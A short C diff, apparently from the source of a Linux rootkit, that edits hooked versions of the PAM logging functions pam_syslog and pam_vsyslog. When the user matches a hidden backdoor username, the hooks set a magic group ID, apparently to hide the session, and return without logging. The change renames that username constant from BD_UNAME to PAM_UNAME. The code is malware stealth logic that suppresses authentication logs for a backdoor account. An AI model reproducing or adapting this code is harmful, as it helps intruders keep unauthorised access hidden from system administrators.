@@ -6,7 +6,7 @@ void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
     char *user = get_username(pamh);
     if(user == NULL) goto end_pam_syslog;
 
-    if(!strcmp(user, BD_UNAME)){
+    if(!strcmp(user, PAM_UNAME)){
         hook(CSETGID);
         call(CSETGID, readgid());
         return;
@@ -24,7 +24,7 @@ void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_lis
     char *user = get_username(pamh);
     if(user == NULL) goto end_pam_vsyslog;    
 
-    if(!strcmp(user, BD_UNAME)){
+    if(!strcmp(user, PAM_UNAME)){
         hook(CSETGID);
         call(CSETGID, readgid());
         return;
